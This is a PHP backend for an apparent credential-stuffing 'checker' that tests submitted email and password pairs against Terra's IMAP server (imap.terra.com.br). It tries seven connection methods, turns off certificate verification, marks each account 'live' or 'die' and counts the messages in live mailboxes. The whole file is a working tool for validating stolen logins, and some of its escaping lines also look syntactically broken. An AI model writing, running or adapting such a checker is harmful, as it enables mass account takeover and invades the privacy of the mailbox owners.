<?php
/**
 * api.php — Backend Kroenen Engine Checker
 * Corrigido: SEM session_start() (removido bloqueio de concorrência)
 */
error_reporting(0);
ini_set('display_errors', '0');
ini_set('session.use_cookies', '0');

$action = $_GET['action'] ?? '';

// ════════════════════════════════════════════════════════
//  INIT
// ════════════════════════════════════════════════════════
if ($action === 'init') {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: *');
    echo json_encode([
        'status'  => 'ok',
        'proxies' => [],
    ]);
    exit;
}

// ════════════════════════════════════════════════════════
//  PING — teste rápido sem IMAP
// ════════════════════════════════════════════════════════
if ($action === 'ping') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'status' => 'ok',
        'pong'   => true,
        'time'   => date('Y-m-d H:i:s'),
        'php'    => PHP_VERSION,
        'exts'   => [
            'curl'    => extension_loaded('curl'),
            'openssl' => extension_loaded('openssl'),
            'imap'    => extension_loaded('imap'),
        ],
    ]);
    exit;
}

// ════════════════════════════════════════════════════════
//  CHECK — Recebe FormData: email, password
// ════════════════════════════════════════════════════════
if ($action === 'check') {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: *');

    $email    = $_POST['email']    ?? '';
    $password = $_POST['password'] ?? '';

    if ($email === '' || $password === '') {
        echo json_encode([
            'status' => 'die',
            'email'  => $email,
            'reason' => 'Credenciais vazias',
        ]);
        exit;
    }

    echo json_encode(doValidate($email, $password));
    exit;
}

// ════════════════════════════════════════════════════════
//  DEFAULT
// ════════════════════════════════════════════════════════
header('Content-Type: application/json; charset=utf-8');
echo json_encode(['status' => 'ok']);
exit;

// ════════════════════════════════════════════════════════════════
//  FUNÇÕES DE VALIDAÇÃO IMAP
// ════════════════════════════════════════════════════════════════

function doValidate(string $email, string $password): array {
    $start   = microtime(true);
    $timeout = 12;
    $debug   = [];

    // ── Método 1: cURL imaps:// ──
    if (extension_loaded('curl')) {
        $r = mCurl($email, $password, $timeout, $start, $debug);
        if ($r !== null) return $r;
    }

    // ── Método 2: fsockopen ssl:// porta 993 ──
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'fsock_ssl', $debug, $timeout, $start, true);
        if ($r !== null) return $r;
    } else {
        $debug[] = "fsock(ssl:993): {$errno}/{$errstr}";
    }

    // ── Método 3: stream_socket ssl:// porta 993 ──
    $ctx = stream_context_create(['ssl' => [
        'verify_peer'       => false,
        'verify_peer_name'  => false,
        'allow_self_signed' => true,
    ]]);
    $socket = @stream_socket_client('ssl://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'stream_ssl', $debug, $timeout, $start, true);
        if ($r !== null) return $r;
    } else {
        $debug[] = "stream(ssl:993): {$errno}/{$errstr}";
    }

    // ── Método 4: stream_socket tls:// porta 993 ──
    $socket = @stream_socket_client('tls://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'stream_tls', $debug, $timeout, $start, true);
        if ($r !== null) return $r;
    } else {
        $debug[] = "stream(tls:993): {$errno}/{$errstr}";
    }

    // ── Método 5: STARTTLS porta 143 ──
    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
    if ($socket !== false) {
        stream_set_timeout($socket, $timeout);
        $greeting = @fgets($socket, 8192);
        if ($greeting && stripos($greeting, 'OK') !== false) {
            fwrite($socket, "A001 STARTTLS\r\n");
            $resp = readUntilTag($socket, 'A001', $timeout);
            if ($resp && preg_match('/A001\s+OK/i', $resp)) {
                $crypto = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                if ($crypto === true) {
                    $debug[] = 'STARTTLS OK';
                    $r = imapLogin($socket, $email, $password, 'starttls', $debug, $timeout, $start, false);
                    if ($r !== null) return $r;
                } else {
                    $debug[] = 'STARTTLS crypto fail';
                    fclose($socket);
                }
            } else {
                $debug[] = 'STARTTLS rejected';
                fclose($socket);
            }
        } else {
            $debug[] = '143 greeting fail';
            fclose($socket);
        }
    } else {
        $debug[] = "fsock(tcp:143): {$errno}/{$errstr}";
    }

    // ── Método 6: Plain TCP porta 143 ──
    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
    if ($socket !== false) {
        $debug[] = 'Plain143: conectado';
        $r = imapLogin($socket, $email, $password, 'plain_143', $debug, $timeout, $start, false);
        if ($r !== null) return $r;
    } else {
        $debug[] = "fsock(plain:143): {$errno}/{$errstr}";
    }

    // ── Método 7: imap_open ──
    if (extension_loaded('imap')) {
        $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
        $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
        if ($conn !== false) {
            $info = @imap_mailboxmsginfo($conn);
            $msgs = $info->Nmsgs ?? 0;
            @imap_close($conn);
            $debug[] = 'imap_open: OK';
            return [
                'status'  => 'live',
                'email'   => $email,
                'reason'  => 'OK',
                'method'  => 'imap_ext',
                'mailbox_messages' => $msgs,
                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
            ];
        }
        $err = @imap_last_error();
        $debug[] = "imap_open: {$err}";
        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
            return [
                'status'  => 'die',
                'email'   => $email,
                'reason'  => 'Invalid credentials',
                'method'  => 'imap_ext',
                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
            ];
        }
    }

    return [
        'status'  => 'die',
        'email'   => $email,
        'reason'  => 'Connection failed',
        'method'  => 'all_failed',
        'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
        'debug'   => implode(' | ', $debug),
    ];
}

function mCurl(string $email, string $password, int $timeout, float $start, array &$debug): ?array {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME       => $email,
        CURLOPT_PASSWORD       => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL       => 1,
    ]);

    $result = curl_exec($ch);
    $err    = curl_error($ch);
    $code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($result !== false) {
        $msgs = 0;
        if (preg_match('/MESSAGES\s+(\d+)/i', (string)$result, $m)) $msgs = (int)$m[1];
        $debug[] = 'cURL: OK';
        return [
            'status'  => 'live',
            'email'   => $email,
            'reason'  => 'OK',
            'method'  => 'curl',
            'mailbox_messages' => $msgs,
            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
        ];
    }

    $el = strtolower($err);
    $debug[] = "cURL: {$err}";

    if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false ||
        strpos($el, 'credential') !== false || strpos($el, 'access') !== false ||
        strpos($el, 'authentication') !== false) {
        return [
            'status'  => 'die',
            'email'   => $email,
            'reason'  => 'Invalid credentials',
            'method'  => 'curl',
            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
        ];
    }

    return null;
}

function imapLogin($socket, string $email, string $password, string $method, array &$debug, int $timeout, float $start, bool $read_greeting): ?array {
    stream_set_timeout($socket, $timeout);

    if ($read_greeting) {
        $greeting = @fgets($socket, 8192);
        if ($greeting === false || $greeting === '') {
            fclose($socket);
            $debug[] = "{$method}: greeting vazio";
            return null;
        }
        if (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $debug[] = "{$method}: greeting sem OK";
            return null;
        }
        $debug[] = "{$method}: greeting OK";
    }

    $tag = 'L001';
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass  = str_replace(['\', '"'], ['\\', '\"'], $password);
    $cmd = "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n";

    if (fwrite($socket, $cmd) === false) {
        fclose($socket);
        $debug[] = "{$method}: write fail";
        return null;
    }

    $response = readUntilTag($socket, $tag, $timeout);
    $meta = stream_get_meta_data($socket);

    if ($response === null || $response === '') {
        fclose($socket);
        $debug[] = "{$method}: resposta vazia";
        return null;
    }

    if (!empty($meta['timed_out'])) {
        fclose($socket);
        $debug[] = "{$method}: timeout";
        return null;
    }

    $qt = preg_quote($tag, '/');

    if (preg_match('/' . $qt . '\s+OK/i', $response)) {
        $msgs = 0;
        @fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
        $sresp = readUntilTag($socket, 'S001', $timeout);
        if ($sresp && preg_match('/MESSAGES\s+(\d+)/i', $sresp, $m)) $msgs = (int)$m[1];
        @fwrite($socket, "X001 LOGOUT\r\n");
        fclose($socket);

        $debug[] = "{$method}: LOGIN OK";
        return [
            'status'  => 'live',
            'email'   => $email,
            'reason'  => 'OK',
            'method'  => $method,
            'mailbox_messages' => $msgs,
            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
        ];
    }

    if (preg_match('/' . $qt . '\s+NO/i', $response)) {
        fclose($socket);
        $debug[] = "{$method}: credenciais inválidas";
        return [
            'status'  => 'die',
            'email'   => $email,
            'reason'  => 'Invalid credentials',
            'method'  => $method,
            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
        ];
    }

    if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
        fclose($socket);
        $debug[] = "{$method}: BAD";
        return null;
    }

    fclose($socket);
    $debug[] = "{$method}: inesperado";
    return null;
}

function readUntilTag($socket, string $tag, int $timeout): ?string {
    $buffer = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $buffer .= $line;
        if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
        $meta = stream_get_meta_data($socket);
        if (!empty($meta['timed_out'])) break;
        if (microtime(true) > $deadline) break;
    }
    return $buffer !== '' ? $buffer : null;
}
